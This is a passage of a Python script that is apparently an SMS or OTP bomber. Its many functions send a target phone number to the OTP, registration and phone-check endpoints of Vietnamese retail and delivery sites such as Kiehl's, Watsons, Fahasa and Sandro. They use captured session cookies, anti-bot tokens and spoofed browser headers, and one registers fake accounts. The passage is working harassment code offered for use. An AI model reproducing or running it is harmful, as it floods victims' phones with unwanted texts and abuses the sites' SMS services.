        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'api': 'user.verifyUserName',
        'username': phone,
    }

    try:
        response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI.VN | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("HASAKI.VN | TRẠNG THÁI : Thất Bại Fuck")



def kiehls(phone):
    cookies = {
        'dwac_a5b49a2c3a0f1f7ca3ef9715a5': 'oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true',
        'cqcid': 'bclcwbad9uTM4EsEYxVq4hk5mq',
        'cquid': '||',
        'sid': 'oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo',
        'dwanonymous_2ebb17ee681f4344abb8404f1ad49bdd': 'bclcwbad9uTM4EsEYxVq4hk5mq',
        '__cq_dnt': '0',
        'dw_dnt': '0',
        'dwsid': '766zywUF33v8EVO88g101vQEqyOO-J-SLqdbC3SO1ELSQDvRfRDvq3uWgIUz6f8Rf3fMNWJhWZ2L6UO0kplCGw==',
        '__cf_bm': 'XeKvc1L7ow12aYP7rWDjGPkuWn_5E.r1bZxL_mA9uFo-1721624892-1.0.1.1-vM_V7sJjryae22PpYcCY5V2F4aWupA.CfdADqumNJ4ytRLZJyIBylEeEOPM9FXdPaNe.CDe16ynSmPQkTFjkcw',
        'cf_clearance': 'oo5t2kFbFMnZ_eCc9.BBb5oppOK8R.i.701furWJA6o-1721624895-1.0.1.1-5O_nLnzjUk6lzjHSr74n0gedwEfQlQ7b3OE.dR6DiBlIrqqJArxEgr4_XMj6Zj35QOU0oQyr77ln6E2REqpE3Q',
        'tracking': '%7B%22category%22%3A%7B%22count%22%3A0%2C%22items%22%3A%5B%22category%22%5D%7D%7D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'dwac_a5b49a2c3a0f1f7ca3ef9715a5=oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo%3D|dw-only|||VND|false|Asia%2FHo%5FChi%5FMinh|true; cqcid=bclcwbad9uTM4EsEYxVq4hk5mq; cquid=||; sid=oy7ANZL0MnhZrMTpJKQ8rLiE2N0ZCXKRixo; dwanonymous_2ebb17ee681f4344abb8404f1ad49bdd=bclcwbad9uTM4EsEYxVq4hk5mq; __cq_dnt=0; dw_dnt=0; dwsid=766zywUF33v8EVO88g101vQEqyOO-J-SLqdbC3SO1ELSQDvRfRDvq3uWgIUz6f8Rf3fMNWJhWZ2L6UO0kplCGw==; __cf_bm=XeKvc1L7ow12aYP7rWDjGPkuWn_5E.r1bZxL_mA9uFo-1721624892-1.0.1.1-vM_V7sJjryae22PpYcCY5V2F4aWupA.CfdADqumNJ4ytRLZJyIBylEeEOPM9FXdPaNe.CDe16ynSmPQkTFjkcw; cf_clearance=oo5t2kFbFMnZ_eCc9.BBb5oppOK8R.i.701furWJA6o-1721624895-1.0.1.1-5O_nLnzjUk6lzjHSr74n0gedwEfQlQ7b3OE.dR6DiBlIrqqJArxEgr4_XMj6Zj35QOU0oQyr77ln6E2REqpE3Q; tracking=%7B%22category%22%3A%7B%22count%22%3A0%2C%22items%22%3A%5B%22category%22%5D%7D%7D',
        'origin': 'https://www.kiehls.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.kiehls.com.vn/vi_VN/account-login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'ajax': 'true',
    }

    data = {
        'cellularPhone': phone,
    }

    try:
        response = requests.post(
            'https://www.kiehls.com.vn/on/demandware.store/Sites-kiehls-vn-ng-Site/vi_VN/SMSVerification-SendSMS',
            params=params,
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KIEHLS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("KIEHLS | TRẠNG THÁI : Thất Bại Fuck")



def emart(phone):
    cookies = {
        'emartsess': 'hk4hc7j1mnphvk2tg5dld4j0d3',
        'default': 'c4aca4bbfc3fc4949e4f881ec7',
        'language': 'vietn',
        'currency': 'VND',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=hk4hc7j1mnphvk2tg5dld4j0d3; default=c4aca4bbfc3fc4949e4f881ec7; language=vietn; currency=VND',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': phone,
    }

    try:
        response = requests.post(
            'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("EMART | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("EMART | TRẠNG THÁI : Thất Bại Fuck")



def watsons(phone):
    cookies = {
        'dtCookie': 'v_4_srv_36_sn_78389D143AE67D0166F10A549E950094_perc_100000_ol_0_mul_1_app-3Aa156527b274862dd_0',
        'PIM-SESSION-ID': 'KeLTcCvBcFaAM7Ks',
        'ROUTE': '.api-6df67c4656-d6j6p',
        'AKA_A2': 'A',
        'ak_bmsc': 'E31AE1DCC8A5D8FB8538C991DE43DD4C~000000000000000000000000000000~YAAQyb0oFxTKab6QAQAAjFCE2Rjt8BLAhfR7mZCaJ7IABI/6nBYaj36Db0p6ZJDzG4KhkHXFPqZ+TnrJxNPp4QtxpGiNRy9IKWXIvkcbRaERswfeqZes6xN9l1tyZ9tnVqvGNxY6fWmj7bJ/wAqBmbn5nkthNqsOV248fyk0H2mnRw3a0cIWX4LNQFoPCYLwev0IjF5zAUaqdt9br3QIWk13QlTGmHkD9Zg0fcm17eh9ZiovLu+OxNX8+qm0WFfJ42UiWcntVhKCgAyle7Bt5+/YeKGSZBPvEWp8Z7pHm74JBvOjVnNUyQhHiu1G5MLaQ562LdPZQ6HlBlzKpXQz8hljtJGmaqO1ZQub5Uw8krLkElS252p4dArEACm3NIKvFiR5FgcGCk0UXFX0',
        'authorization': 'eIoVNH5XuB4bIiORjaaVO1iXwSU',
        'token_type': 'guest',
        'bm_mi': 'E2BE16B4175E923DABE3D82FBFF24664~YAAQyb0oF2Hjab6QAQAAN3uE2RgWjYGGJ8/uZoZObQVn1GO7IzJvpNTQqMJ33/xmfZhwdecFR3pZIrqQ6/hKiWsQcf7lkJBbLSAvwZ5XospWLtNcpsq58b1aBEPEL5VTicWc2Y0B27B1ehuBPTQaLBtz57IBvCiU7dImV33WirAOpq4wzpdHplX/ORU+ZvS1VveWGSDeWdBKyLi33cNInyM4lk0BXQT/Rd1cmhefuU2PK3D7S+oM86KiB6FUpnhaMH8du102SXZzAmELLItlAaR79Pgq7oX1pMjlC13gtNSSrd+88JTPT5HcK6fLuABMoK6/gRu6ZyMw~1',
        '_abck': '2EF1DA00357C893E967384BA03295C65~0~YAAQ31JNGxgxINmQAQAAGrmE2QzWa3gzvT6muyPn3xQyG66nWtsjmmz56fF161mJuOXOni/D1IiTzKVDPx6j58OfS7doDfha8HL37VbG5Xd3sTBiEQCOqO6qKdCPM+ldNYZQXfS06JbrCDjT5tmBX4MQAJ19emvH+u5757kK+WeNDROEKhmsqW/D/3jV3YI2perZITclDJxuuzEJKb33DGcc2EqLjRX7zzenCx0PyHUo60WvrR68rbo1hmzXy7o88P/wPBtfhKE2g2XHW7jaLDw3vpZvC2pg+QDS8MQMctG+JDbn6O/mi73YWqg3mBUonKzDs9k970iXZOsGSMYfzjrJM6Pkt8A5tW1a79TmH7c+FeprSaQb5SFDGtynUy0oM26QSNLFnamCcUdtQWnGtalq5WOA2MwEfVo7uL0vWaSNG4wr43FS+v4v/P4ylpx4o10TDcWCVVQJnzphjyhwxCR9i2b8WmbKKis8WH7tls3JspZbrRwbOg==~-1~-1~-1',
        'bm_sv': '65A51408418F3652B39E8481B85F70F3~YAAQ31JNGxkxINmQAQAAGrmE2RgTmiy1bNYdgQ4OjVlKLE7jmNL2DWFFfLF2mhgB1U2RGfPziEY3IYs2fKuknLfWZPEGvEZbSCKaqtoDgeT8Olk4p8YddYovOJ4S91mchuMPD2c0uOCKPLsMyc1SN2/ailEI+zLIn+S38H01hI+cTm30BM0ut7i1ueHR6SPFi9KpgZShseXoIn26/jAj4F6axZaLc3wLA5GQaEBcRsUGBbxTtA1aeMKtY9sIKl475w==~1',
        'bm_sz': '38994E99080E4985C36D7F989AEB7C92~YAAQ31JNGxoxINmQAQAAG7mE2RidSEMD/NtmBF9EO4NMTjX7d4awNQFjWTKEMuyzzi2BeaemzAuTOhgMAIPbOQiEjHfkN4C7S/z8uy4EfOdlRUNrny86trif+7fc9EtWIhmmJAbXv0+wOTXn8nVwgtKLWdtF2phFNfOkHtCEp5vT1fPcy48wj0LvXUrQk79lHolDtz/RHK1AiYu7k6an3/Kr21zMiK3+73jr43XGIPF9PZkWyvGREnG2fwYSQfb5b2l+NxMxVnANG/vVzOhBhHvYKE03/eGUgbIbM6OGzkeWovx284X0BrUXkKGzaWXpxTg69k/y+Enu0t+cyEkDZf8EjnJL7yRPk7RDPJ1LM75CjY+scUUVkrs7dqe10RIdC5l2R9lcDSZ7CzQXMbMirxuPfC96MS+E2doINPeHBIZUFyZCWnaKYRHzRB6uxQ==~4277571~3687480',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'bearer eIoVNH5XuB4bIiORjaaVO1iXwSU',
        'cache-control': 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0',
        'content-type': 'application/json',
        'expires': '0',
        'if-modified-since': 'Mon, 22 Jul 2024 08:17:50 GMT',
        'origin': 'https://www.watsons.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'queue-target': 'https://www.watsons.vn/vi/register',
        'queueit-target': 'https://www.watsons.vn/vi/register',
        'referer': 'https://www.watsons.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'vary': '*',
    }

    params = {
        'formId': 'registrationOTPForm_Web3',
        'lang': 'vi',
        'curr': 'VND',
    }

    json_data = {
        'uid': '',
        'action': 'REGISTRATION',
        'countryCode': '84',
        'target': phone,
        'type': 'SMS',
    }

    try:
        response = requests.post(
            'https://api.watsons.vn/api/v2/wtcvn/otpToken',
            params=params,
            cookies=cookies,
            headers=headers,
            json=json_data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("WATSONS | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("WATSONS | TRẠNG THÁI : Thất Bại Fuck")



def hanoia(phone):
    cookies = {
        'PHPSESSID': 'ah759kbp93umoqr5180jcbf75c',
        'form_key': 'dlinj8ESlS5lQx06',
        'form_key': 'dlinj8ESlS5lQx06',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'private_content_version': '88ede4a3f3efc946fd38132bc5254912',
        'section_data_ids': '%7B%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=ah759kbp93umoqr5180jcbf75c; form_key=dlinj8ESlS5lQx06; form_key=dlinj8ESlS5lQx06; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; private_content_version=88ede4a3f3efc946fd38132bc5254912; section_data_ids=%7B%7D',
        'origin': 'https://hanoia.com',
        'priority': 'u=1, i',
        'referer': 'https://hanoia.com/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': phone,
        'form_key': 'dlinj8ESlS5lQx06',
        'currentUrl': 'https://hanoia.com/customer/account/create/',
    }

    try:
        response = requests.post('https://hanoia.com/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HANOIA | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("HANOIA | TRẠNG THÁI : Thất Bại Fuck")



def ahamove(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'priority': 'u=1, i',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'mobile': phone,
        'country_code': 'VN',
        'firebase_sms_auth': True,
    }

    try:
        response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AHAMOVE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("AHAMOVE | TRẠNG THÁI : Thất Bại Fuck")



def fahasa(phone):
    cookies = {
        'frontend': '2f118fe3b8c748c78199208b10b3f9cb',
        'utm_source': 'chin',
        'click_id': '8vTZ22kVeRZoISe',
        'utm_medium': 'chin',
        'utm_campaign': 'chin',
        'utm_term': 'chin',
        'utm_content': 'chin',
        'frontend_cid': 'uqAGx0CC6GhLtoUa',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=2f118fe3b8c748c78199208b10b3f9cb; utm_source=chin; click_id=8vTZ22kVeRZoISe; utm_medium=chin; utm_campaign=chin; utm_term=chin; utm_content=chin; frontend_cid=uqAGx0CC6GhLtoUa',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/?ref=chin&utm_source=chin&utm_medium=chin&utm_campaign=chin&utm_term=chin&utm_content=chin&click_id=8vTZ22kVeRZoISe',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
    }

    try:
        response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FAHASA | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("FAHASA | TRẠNG THÁI : Thất Bại Fuck") 



def vascara(phone):
    cookies = {
        'SHASH': 'ijiugnnbjqt1sravu0ag6dpvhn',
        'ctk': 'a98dd75f4edd2233308533430aebf26fcf6d1791d43bd503f95fd2b8f3f9bd3c',
        'fwlc': 'MQ%3D%3D',
        '_t': 'ijiugnnbjqt1sravu0ag6dpvhn',
        'ctiic': 'MA%3D%3D',
        'cokilocationcode': 'dm4%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'SHASH=ijiugnnbjqt1sravu0ag6dpvhn; ctk=a98dd75f4edd2233308533430aebf26fcf6d1791d43bd503f95fd2b8f3f9bd3c; fwlc=MQ%3D%3D; _t=ijiugnnbjqt1sravu0ag6dpvhn; ctiic=MA%3D%3D; cokilocationcode=dm4%3D',
        'origin': 'https://www.vascara.com',
        'priority': 'u=0, i',
        'referer': 'https://www.vascara.com/register/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'token': '6c6cf6eeb0482f868c3f921b12bf01ef4b1baef6',
        'fphone': phone,
        'ffullname': 'nguyen thi huyen',
        'fpassword': '123123aA@',
        'fagree': '1',
        'fsubmit': '1',
    }

    try:
        response = requests.post('https://www.vascara.com/register/', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VASCARA | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("VASCARA | TRẠNG THÁI : Thất Bại Fuck")



def sablanca(phone):
    cookies = {
        'ASP.NET_SessionId': '1psn00n0dg1cj303ia2pi32e',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'ASP.NET_SessionId=1psn00n0dg1cj303ia2pi32e',
        'Origin': 'https://sablanca.vn',
        'Referer': 'https://sablanca.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'numberphone': phone,
        'utm_source': 'Register',
    }

    try:
        response = requests.post('https://sablanca.vn/User/CheckCustomerPhoneIsCreateV21', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SABLANCA | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("SABLANCA | TRẠNG THÁI : Thất Bại Fuck")



def sandro(phone):
    cookies = {
        'PHPSESSID': 'e4dm9dd73g7s1p5s8a0408osmu',
        'form_key': 'MVfTxS24jyAJkIgf',
        'form_key': 'MVfTxS24jyAJkIgf',
        'category_first': '3',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'mgn_menu_category_1': '21',
        'private_content_version': '4fa1b90d7f995085e3ce9442f6fa924a',
        'section_data_ids': '%7B%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=e4dm9dd73g7s1p5s8a0408osmu; form_key=MVfTxS24jyAJkIgf; form_key=MVfTxS24jyAJkIgf; category_first=3; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; mgn_menu_category_1=21; private_content_version=4fa1b90d7f995085e3ce9442f6fa924a; section_data_ids=%7B%7D',
        'origin': 'https://sandro.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://sandro.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': phone,
        'form_key': 'MVfTxS24jyAJkIgf',
        'currentUrl': 'https://sandro.com.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://sandro.com.vn/smsmarketing/customer/sendOTP', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SANDRO | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("SANDRO | TRẠNG THÁI : Thất Bại Fuck")



def routine(phone):
    cookies = {
        'wp_ga4_customerGroup': 'NOT%20LOGGED%20IN',
        'X-Magento-Vary': '7ad851671356eb8fbf873fbdb216dde0a2e0c003',
        'PHPSESSID': 'j54mg8mlaj1fe1tpa8n7lig4g1',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'mage-messages': '',
        'form_key': 'JUHbfiSaEBTLQRud',
        'private_content_version': '7f7eeb6ab1ef8a3d8536cfcfa413ff07',
        'section_data_ids': '%7B%22customer%22%3A1721578592%2C%22compare-products%22%3A1721578592%2C%22last-ordered-items%22%3A1721578592%2C%22cart%22%3A1721644002%2C%22directory-data%22%3A1721578592%2C%22captcha%22%3A1721578592%2C%22instant-purchase%22%3A1721578592%2C%22loggedAsCustomer%22%3A1721578592%2C%22persistent%22%3A1721644002%2C%22review%22%3A1721578592%2C%22wishlist%22%3A1721578592%2C%22ammessages%22%3A1721578592%2C%22chatData%22%3A1721578592%2C%22guest_wishlist%22%3A1721578592%2C%22magenest-fbpixel-atc%22%3A1721578592%2C%22magenest-fbpixel-subscribe%22%3A1721578592%2C%22google-tag-manager-product-info%22%3A1721578592%2C%22wp_ga4%22%3A1721578592%2C%22recently_viewed_product%22%3A1721578592%2C%22recently_compared_product%22%3A1721578592%2C%22product_data_storage%22%3A1721578592%2C%22paypal-billing-agreement%22%3A1721578592%2C%22messages%22%3A1721644002%7D',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; PHPSESSID=j54mg8mlaj1fe1tpa8n7lig4g1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=JUHbfiSaEBTLQRud; private_content_version=7f7eeb6ab1ef8a3d8536cfcfa413ff07; section_data_ids=%7B%22customer%22%3A1721578592%2C%22compare-products%22%3A1721578592%2C%22last-ordered-items%22%3A1721578592%2C%22cart%22%3A1721644002%2C%22directory-data%22%3A1721578592%2C%22captcha%22%3A1721578592%2C%22instant-purchase%22%3A1721578592%2C%22loggedAsCustomer%22%3A1721578592%2C%22persistent%22%3A1721644002%2C%22review%22%3A1721578592%2C%22wishlist%22%3A1721578592%2C%22ammessages%22%3A1721578592%2C%22chatData%22%3A1721578592%2C%22guest_wishlist%22%3A1721578592%2C%22magenest-fbpixel-atc%22%3A1721578592%2C%22magenest-fbpixel-subscribe%22%3A1721578592%2C%22google-tag-manager-product-info%22%3A1721578592%2C%22wp_ga4%22%3A1721578592%2C%22recently_viewed_product%22%3A1721578592%2C%22recently_compared_product%22%3A1721578592%2C%22product_data_storage%22%3A1721578592%2C%22paypal-billing-agreement%22%3A1721578592%2C%22messages%22%3A1721644002%7D',
        'origin': 'https://routine.vn',
        'priority': 'u=1, i',
        'referer': 'https://routine.vn/phu-kien/giay-dep.html',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'telephone': phone,
        'isForgotPassword': '0',
    }

    try:
        response = requests.post('https://routine.vn/customer/otp/send/', cookies=cookies, headers=headers, data=data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ROUTINE | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("ROUTINE | TRẠNG THÁI : Thất Bại Fuck")
        


def coolmate(phone):
    cookies = {
        'device_token': '597f946e29e835d88f56392f40ea75c3',
        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
        'cart_quantity': '0',
        'active-voucher1': 'true',
